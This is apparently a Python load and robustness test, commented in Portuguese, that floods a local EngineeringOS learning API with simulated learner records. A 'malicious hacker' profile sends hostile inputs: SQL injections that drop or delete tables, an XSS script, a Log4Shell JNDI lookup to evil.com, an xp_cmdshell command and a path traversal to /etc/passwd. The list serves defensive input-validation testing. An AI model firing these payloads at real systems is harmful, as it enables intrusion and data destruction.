"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  MEGA STRESS TEST — EngineeringOS API                                       ║
║  10.000 aprendizes virtuais × 3-5 evidências cada = ~40.000 requisições     ║
║  Perfis cognitivos: Esponja Rápida, Amnésico Lento, Errático Impulsivo,     ║
║                     Estudante Médio, Hacker Malicioso                       ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import json
import os
import random
import string
import sys
import time
import uuid
from collections import Counter
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple

import httpx

# ---------------------------------------------------------------------------
# Configuração de caminhos — garante que 'src' seja importável
# ---------------------------------------------------------------------------
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
if SCRIPT_DIR not in sys.path:
    sys.path.insert(0, SCRIPT_DIR)

# ---------------------------------------------------------------------------
# Inicialização do banco de dados (SQLite fallback)
# ---------------------------------------------------------------------------
# Força SQLite para testes locais sem Docker
os.environ.setdefault("DATABASE_URL", f"sqlite+aiosqlite:///{os.path.join(SCRIPT_DIR, 'stress_test.db')}")

from src.database import engine
from src.models import Base

async def ensure_db():
    """Cria todas as tabelas no banco se ainda não existirem."""
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

asyncio.run(ensure_db())
print("[DB] ✅ Banco de dados inicializado com sucesso.")

# ---------------------------------------------------------------------------
# Geração do token JWT
# ---------------------------------------------------------------------------
from src.security import create_access_token

TOKEN = create_access_token({"sub": "stress_user", "role": "admin"})
AUTH_HEADERS = {"Authorization": f"Bearer {TOKEN}"}

# ---------------------------------------------------------------------------
# Constantes
# ---------------------------------------------------------------------------
API_BASE = "http://localhost:8000/api"
TOTAL_LEARNERS = 10_000
MAX_CONCURRENT = 100
REQUEST_TIMEOUT = 30.0

# KUs válidas extraídas do seed do currículo
VALID_KU_IDS = [
    "linear_algebra.matrix_definition.v1",
    "linear_algebra.dot_product.v1",
    "linear_algebra.matrix_multiplication.v1",
    "linear_algebra.eigenvalues.v1",
    "calculus.partial_derivatives.v1",
    "ml.gradient_descent.v1",
]

EVIDENCE_TYPES = ["artifact", "explanation", "solution", "decision", "benchmark"]

REVIEWER_TYPES = ["ai", "peer", "instructor", "expert"]
VERDICTS = ["accept", "reject", "partial"]

# Payloads de SQL injection para o perfil Hacker
SQL_INJECTIONS = [
    "'; DROP TABLE learners; --",
    "1' OR '1'='1",
    "ku:test' UNION SELECT * FROM users --",
    "'; DELETE FROM evidence_records WHERE '1'='1",
    "<script>alert('xss')</script>",
    "{{7*7}}",
    "${jndi:ldap://evil.com/a}",
    "' OR 1=1; EXEC xp_cmdshell('dir') --",
    "../../../etc/passwd",
    "null\x00byte",
]

# ---------------------------------------------------------------------------
# Distribuição dos perfis cognitivos
# ---------------------------------------------------------------------------
PROFILE_WEIGHTS = {
    "Esponja Rápida":     0.30,  # 30%
    "Amnésico Lento":     0.25,  # 25%
    "Errático Impulsivo": 0.20,  # 20%
    "Estudante Médio":    0.15,  # 15%
    "Hacker Malicioso":   0.10,  # 10%
}

PROFILE_NAMES = list(PROFILE_WEIGHTS.keys())
PROFILE_CUMULATIVE = []
_cumsum = 0.0
for name in PROFILE_NAMES:
    _cumsum += PROFILE_WEIGHTS[name]
    PROFILE_CUMULATIVE.append(_cumsum)


def pick_profile() -> str:
    """Seleciona um perfil cognitivo baseado na distribuição ponderada."""
    r = random.random()
    for i, threshold in enumerate(PROFILE_CUMULATIVE):
        if r <= threshold:
            return PROFILE_NAMES[i]
    return PROFILE_NAMES[-1]


# ---------------------------------------------------------------------------
# Geração de dados por perfil
# ---------------------------------------------------------------------------
def generate_reviewers(count: int = 1) -> List[Dict[str, str]]:
    """Gera uma lista de revisores aleatórios."""
    return [
        {
            "reviewer_id": f"rev_{uuid.uuid4().hex[:8]}",
            "reviewer_type": random.choice(REVIEWER_TYPES),
            "verdict": random.choice(VERDICTS),
        }
        for _ in range(count)
    ]


def build_evidence_payload(
    learner_id: str, profile: str
) -> Dict[str, Any]:
    """Constrói o payload de evidência conforme o perfil cognitivo."""

    if profile == "Esponja Rápida":
        return {
            "learner_id": learner_id,
            "ku_id": random.choice(VALID_KU_IDS),
            "type": random.choice(EVIDENCE_TYPES),
            "source_weight": round(random.uniform(0.8, 1.0), 4),
            "reviewer_agreement": round(random.uniform(0.9, 1.0), 4),
            "recency_factor": round(random.uniform(0.8, 1.0), 4),
            "reviewers": generate_reviewers(random.randint(1, 3)),
        }

    elif profile == "Amnésico Lento":
        return {
            "learner_id": learner_id,
            "ku_id": random.choice(VALID_KU_IDS),
            "type": random.choice(EVIDENCE_TYPES),
            "source_weight": round(random.uniform(0.2, 0.4), 4),
            "reviewer_agreement": round(random.uniform(0.3, 0.6), 4),
            "recency_factor": round(random.uniform(0.1, 0.3), 4),
            "reviewers": generate_reviewers(1),
        }

    elif profile == "Errático Impulsivo":
        # Valores intencionalmente fora dos limites (0.0–1.5) para testar validação
        return {
            "learner_id": learner_id,
            "ku_id": random.choice(VALID_KU_IDS),
            "type": random.choice(EVIDENCE_TYPES),
            "source_weight": round(random.uniform(0.0, 1.5), 4),
            "reviewer_agreement": round(random.uniform(0.0, 1.5), 4),
            "recency_factor": round(random.uniform(0.0, 1.5), 4),
            "reviewers": generate_reviewers(random.randint(0, 2)),
        }

    elif profile == "Estudante Médio":
        return {
            "learner_id": learner_id,
            "ku_id": random.choice(VALID_KU_IDS),
            "type": random.choice(EVIDENCE_TYPES),
            "source_weight": round(random.uniform(0.5, 0.7), 4),
            "reviewer_agreement": round(random.uniform(0.6, 0.8), 4),
            "recency_factor": round(random.uniform(0.5, 0.7), 4),
            "reviewers": generate_reviewers(random.randint(1, 2)),
        }

    else:  # Hacker Malicioso
        attack_variant = random.randint(0, 4)

        if attack_variant == 0:
            # SQL injection no ku_id
            return {
                "learner_id": learner_id,
                "ku_id": random.choice(SQL_INJECTIONS),
                "type": random.choice(EVIDENCE_TYPES),
                "source_weight": round(random.uniform(0.0, 1.0), 4),
                "reviewer_agreement": round(random.uniform(0.0, 1.0), 4),
                "recency_factor": round(random.uniform(0.0, 1.0), 4),
                "reviewers": generate_reviewers(1),
            }
        elif attack_variant == 1:
            # Valores negativos
            return {
                "learner_id": learner_id,
                "ku_id": random.choice(VALID_KU_IDS),
                "type": "artifact",
                "source_weight": -999.99,
                "reviewer_agreement": -1.0,
                "recency_factor": -0.5,
                "reviewers": generate_reviewers(1),
            }
        elif attack_variant == 2:
            # Campos nulos / tipos errados
            return {
                "learner_id": learner_id,
                "ku_id": None,
                "type": None,
                "source_weight": "not_a_number",
                "reviewer_agreement": None,
                "recency_factor": True,
                "reviewers": "NOT_A_LIST",
            }
        elif attack_variant == 3:
            # UUID inválido no learner_id
            return {
                "learner_id": "not-a-uuid-at-all",
                "ku_id": random.choice(VALID_KU_IDS),
                "type": "solution",
                "source_weight": 0.5,
                "reviewer_agreement": 0.5,
                "recency_factor": 0.5,
                "reviewers": [],
            }
        else:
            # Payload gigante (tentativa de overflow)
            return {
                "learner_id": learner_id,
                "ku_id": "A" * 10_000,
                "type": "x" * 5_000,
                "source_weight": float("inf"),
                "reviewer_agreement": float("nan"),
                "recency_factor": 99999999.0,
                "reviewers": [{"reviewer_id": "r", "reviewer_type": "ai", "verdict": "accept"}] * 500,
            }


# ---------------------------------------------------------------------------
# Métricas
# ---------------------------------------------------------------------------
@dataclass
class StressMetrics:
    """Acumulador thread-safe de métricas do teste de stress."""
    total_sent: int = 0
    http_200_201: int = 0
    http_401: int = 0
    http_404: int = 0
    http_422: int = 0
    http_500: int = 0
    http_other: int = 0
    timeouts: int = 0
    connection_errors: int = 0
    exceptions: int = 0
    profile_counts: Dict[str, int] = field(default_factory=Counter)
    profile_successes: Dict[str, int] = field(default_factory=Counter)
    errors_log: List[Dict[str, Any]] = field(default_factory=list)
    _lock: asyncio.Lock = field(default_factory=asyncio.Lock, repr=False)

    async def record(
        self,
        status: Optional[int],
        profile: str,
        endpoint: str,
        payload: Any = None,
        error_msg: str = "",
        is_timeout: bool = False,
        is_conn_error: bool = False,
    ):
        async with self._lock:
            self.total_sent += 1
            self.profile_counts[profile] += 1

            if is_timeout:
                self.timeouts += 1
                self.errors_log.append({
                    "tipo": "timeout",
                    "perfil": profile,
                    "endpoint": endpoint,
                    "mensagem": error_msg,
                    "timestamp": datetime.now().isoformat(),
                })
                return

            if is_conn_error:
                self.connection_errors += 1
                self.errors_log.append({
                    "tipo": "connection_error",
                    "perfil": profile,
                    "endpoint": endpoint,
                    "mensagem": error_msg,
                    "timestamp": datetime.now().isoformat(),
                })
                return

            if status is None:
                self.exceptions += 1
                self.errors_log.append({
                    "tipo": "exceção",
                    "perfil": profile,
                    "endpoint": endpoint,
                    "mensagem": error_msg,
                    "timestamp": datetime.now().isoformat(),
                })
                return

            if status in (200, 201):
                self.http_200_201 += 1
                self.profile_successes[profile] += 1
            elif status == 401:
                self.http_401 += 1
            elif status == 404:
                self.http_404 += 1
            elif status == 422:
                self.http_422 += 1
            elif status >= 500:
                self.http_500 += 1
                self.errors_log.append({
                    "tipo": f"HTTP {status}",
                    "perfil": profile,
                    "endpoint": endpoint,
                    "payload": _safe_serialize(payload),
                    "mensagem": error_msg[:2000],
                    "timestamp": datetime.now().isoformat(),
                })
            else:
                self.http_other += 1


def _safe_serialize(obj: Any) -> Any:
    """Serializa um objeto de forma segura para JSON."""
    try:
        json.dumps(obj)
        return obj
    except (TypeError, ValueError, OverflowError):
        return str(obj)[:500]


# ---------------------------------------------------------------------------
# Lógica principal de bombardeio
# ---------------------------------------------------------------------------
async def process_learner(
    idx: int,
    profile: str,
    client: httpx.AsyncClient,
    semaphore: asyncio.Semaphore,
    metrics: StressMetrics,
):
    """Cria um aprendiz e envia 3-5 evidências."""
    async with semaphore:
        learner_name = f"Aprendiz_{idx:05d}_{profile.replace(' ', '_')}"
        learner_id: Optional[str] = None

        # ── 1. Criar aprendiz ──────────────────────────────────────────
        try:
            resp = await client.post(
                f"{API_BASE}/learners",
                json={"name": learner_name},
                headers=AUTH_HEADERS,
                timeout=REQUEST_TIMEOUT,
            )
            await metrics.record(
                status=resp.status_code,
                profile=profile,
                endpoint="POST /api/learners",
                payload={"name": learner_name},
                error_msg=resp.text if resp.status_code >= 400 else "",
            )
            if resp.status_code in (200, 201):
                learner_id = resp.json().get("id")
            else:
                # Se não conseguiu criar o learner, não pode enviar evidências
                return

        except httpx.TimeoutException as e:
            await metrics.record(
                status=None, profile=profile,
                endpoint="POST /api/learners",
                error_msg=str(e), is_timeout=True,
            )
            return
        except httpx.ConnectError as e:
            await metrics.record(
                status=None, profile=profile,
                endpoint="POST /api/learners",
                error_msg=str(e), is_conn_error=True,
            )
            return
        except Exception as e:
            await metrics.record(
                status=None, profile=profile,
                endpoint="POST /api/learners",
                error_msg=f"{type(e).__name__}: {e}",
            )
            return

        if not learner_id:
            return

        # ── 2. Enviar 3-5 evidências ──────────────────────────────────
        num_evidences = random.randint(3, 5)
        for ev_idx in range(num_evidences):
            payload = build_evidence_payload(learner_id, profile)

            try:
                resp = await client.post(
                    f"{API_BASE}/evidence",
                    json=payload,
                    headers=AUTH_HEADERS,
                    timeout=REQUEST_TIMEOUT,
                )
                await metrics.record(
                    status=resp.status_code,
                    profile=profile,
                    endpoint="POST /api/evidence",
                    payload=payload,
                    error_msg=resp.text if resp.status_code >= 400 else "",
                )

            except httpx.TimeoutException as e:
                await metrics.record(
                    status=None, profile=profile,
                    endpoint="POST /api/evidence",
                    error_msg=str(e), is_timeout=True,
                )
            except httpx.ConnectError as e:
                await metrics.record(
                    status=None, profile=profile,
                    endpoint="POST /api/evidence",
                    error_msg=str(e), is_conn_error=True,
                )
            except Exception as e:
                await metrics.record(
                    status=None, profile=profile,
                    endpoint="POST /api/evidence",
                    error_msg=f"{type(e).__name__}: {e}",
                )


async def run_mega_stress_test():
    """Função principal do mega stress test."""

    print()
    print("=" * 78)
    print("  🔥  MEGA STRESS TEST — EngineeringOS API")
    print(f"  📊  {TOTAL_LEARNERS:,} aprendizes virtuais | {MAX_CONCURRENT} conexões simultâneas")
    print(f"  🕐  Iniciado em: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 78)
    print()

    # ── Pré-geração dos perfis ────────────────────────────────────────
    learner_profiles: List[Tuple[int, str]] = []
    for i in range(TOTAL_LEARNERS):
        learner_profiles.append((i, pick_profile()))

    profile_distribution = Counter(p for _, p in learner_profiles)
    print("📋 Distribuição de perfis cognitivos:")
    for name in PROFILE_NAMES:
        count = profile_distribution.get(name, 0)
        pct = count / TOTAL_LEARNERS * 100
        bar = "█" * int(pct / 2)
        print(f"   {name:<22s} {count:>5,d} ({pct:5.1f}%) {bar}")
    print()

    # Estima total de requisições
    estimated_requests = TOTAL_LEARNERS + sum(
        random.randint(3, 5) for _ in range(TOTAL_LEARNERS)
    )
    print(f"📡 Requisições estimadas: ~{estimated_requests:,d}")
    print()

    # ── Execução ──────────────────────────────────────────────────────
    metrics = StressMetrics()
    semaphore = asyncio.Semaphore(MAX_CONCURRENT)

    limits = httpx.Limits(
        max_connections=MAX_CONCURRENT + 20,
        max_keepalive_connections=MAX_CONCURRENT,
    )

    start_time = time.perf_counter()
    progress_interval = max(1, TOTAL_LEARNERS // 20)  # 5% increments

    async with httpx.AsyncClient(limits=limits) as client:
        tasks = []
        for idx, profile in learner_profiles:
            task = asyncio.create_task(
                process_learner(idx, profile, client, semaphore, metrics)
            )
            tasks.append(task)

        # Monitora progresso
        completed = 0
        for coro in asyncio.as_completed(tasks):
            await coro
            completed += 1
            if completed % progress_interval == 0 or completed == TOTAL_LEARNERS:
                elapsed = time.perf_counter() - start_time
                rps = metrics.total_sent / elapsed if elapsed > 0 else 0
                pct = completed / TOTAL_LEARNERS * 100
                print(
                    f"   ⏳ Progresso: {completed:>6,d}/{TOTAL_LEARNERS:,d} "
                    f"({pct:5.1f}%) | "
                    f"Enviadas: {metrics.total_sent:>7,d} | "
                    f"RPS: {rps:>7.1f} | "
                    f"Erros 500: {metrics.http_500}"
                )

    elapsed_total = time.perf_counter() - start_time

    # ── Relatório final ───────────────────────────────────────────────
    print()
    print("=" * 78)
    print("  📊  RELATÓRIO FINAL DO MEGA STRESS TEST")
    print("=" * 78)
    print()

    rps_final = metrics.total_sent / elapsed_total if elapsed_total > 0 else 0

    # Tabela principal
    rows = [
        ("Tempo total",                f"{elapsed_total:>10.2f}s"),
        ("Requisições enviadas",       f"{metrics.total_sent:>10,d}"),
        ("Requisições/segundo (RPS)",  f"{rps_final:>10.1f}"),
        ("", ""),
        ("HTTP 200/201 (sucesso)",     f"{metrics.http_200_201:>10,d}"),
        ("HTTP 401 (auth falhou)",     f"{metrics.http_401:>10,d}"),
        ("HTTP 404 (defesa OK)",       f"{metrics.http_404:>10,d}"),
        ("HTTP 422 (validação OK)",    f"{metrics.http_422:>10,d}"),
        ("HTTP 500 (ERRO REAL ⚠️)",    f"{metrics.http_500:>10,d}"),
        ("HTTP outros",               f"{metrics.http_other:>10,d}"),
        ("Timeouts",                   f"{metrics.timeouts:>10,d}"),
        ("Erros de conexão",           f"{metrics.connection_errors:>10,d}"),
        ("Exceções não-HTTP",          f"{metrics.exceptions:>10,d}"),
    ]

    print("  ┌─────────────────────────────────┬──────────────┐")
    print("  │ Métrica                          │     Valor    │")
    print("  ├─────────────────────────────────┼──────────────┤")
    for label, value in rows:
        if label == "":
            print("  ├─────────────────────────────────┼──────────────┤")
        else:
            print(f"  │ {label:<33s} │ {value:>12s} │")
    print("  └─────────────────────────────────┴──────────────┘")
    print()

    # Tabela por perfil
    print("  ┌──────────────────────────┬──────────┬──────────┬──────────┐")
    print("  │ Perfil Cognitivo         │  Enviadas│ Sucesso  │  Taxa %  │")
    print("  ├──────────────────────────┼──────────┼──────────┼──────────┤")
    for name in PROFILE_NAMES:
        sent = metrics.profile_counts.get(name, 0)
        ok = metrics.profile_successes.get(name, 0)
        rate = (ok / sent * 100) if sent > 0 else 0.0
        print(f"  │ {name:<24s} │ {sent:>8,d} │ {ok:>8,d} │ {rate:>7.1f}% │")
    print("  └──────────────────────────┴──────────┴──────────┴──────────┘")
    print()

    # ── Veredicto ─────────────────────────────────────────────────────
    real_errors = metrics.http_500 + metrics.exceptions + metrics.connection_errors
    if real_errors == 0:
        print("  ✅  VEREDICTO: API RESISTIU AO MEGA STRESS TEST SEM ERROS REAIS!")
    else:
        print(f"  ❌  VEREDICTO: {real_errors} ERROS REAIS DETECTADOS — INVESTIGAR!")
    print()

    # ── Salva erros em arquivo ────────────────────────────────────────
    errors_path = os.path.join(SCRIPT_DIR, "mega_stress_errors.json")

    output = {
        "meta": {
            "timestamp": datetime.now().isoformat(),
            "total_aprendizes": TOTAL_LEARNERS,
            "concorrência_máxima": MAX_CONCURRENT,
            "tempo_total_segundos": round(elapsed_total, 2),
            "rps_médio": round(rps_final, 1),
        },
        "resumo": {
            "total_enviadas": metrics.total_sent,
            "http_200_201": metrics.http_200_201,
            "http_401": metrics.http_401,
            "http_404": metrics.http_404,
            "http_422": metrics.http_422,
            "http_500": metrics.http_500,
            "http_outros": metrics.http_other,
            "timeouts": metrics.timeouts,
            "erros_conexão": metrics.connection_errors,
            "exceções": metrics.exceptions,
        },
        "erros_reais": metrics.errors_log,
    }

    with open(errors_path, "w", encoding="utf-8") as f:
        json.dump(output, f, indent=2, ensure_ascii=False, default=str)

    print(f"  📁 Relatório de erros salvo em: {errors_path}")
    print(f"     ({len(metrics.errors_log)} entradas de erro registradas)")
    print()
    print("=" * 78)
    print("  FIM DO MEGA STRESS TEST")
    print("=" * 78)


# ---------------------------------------------------------------------------
# Entrypoint
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    asyncio.run(run_mega_stress_test())
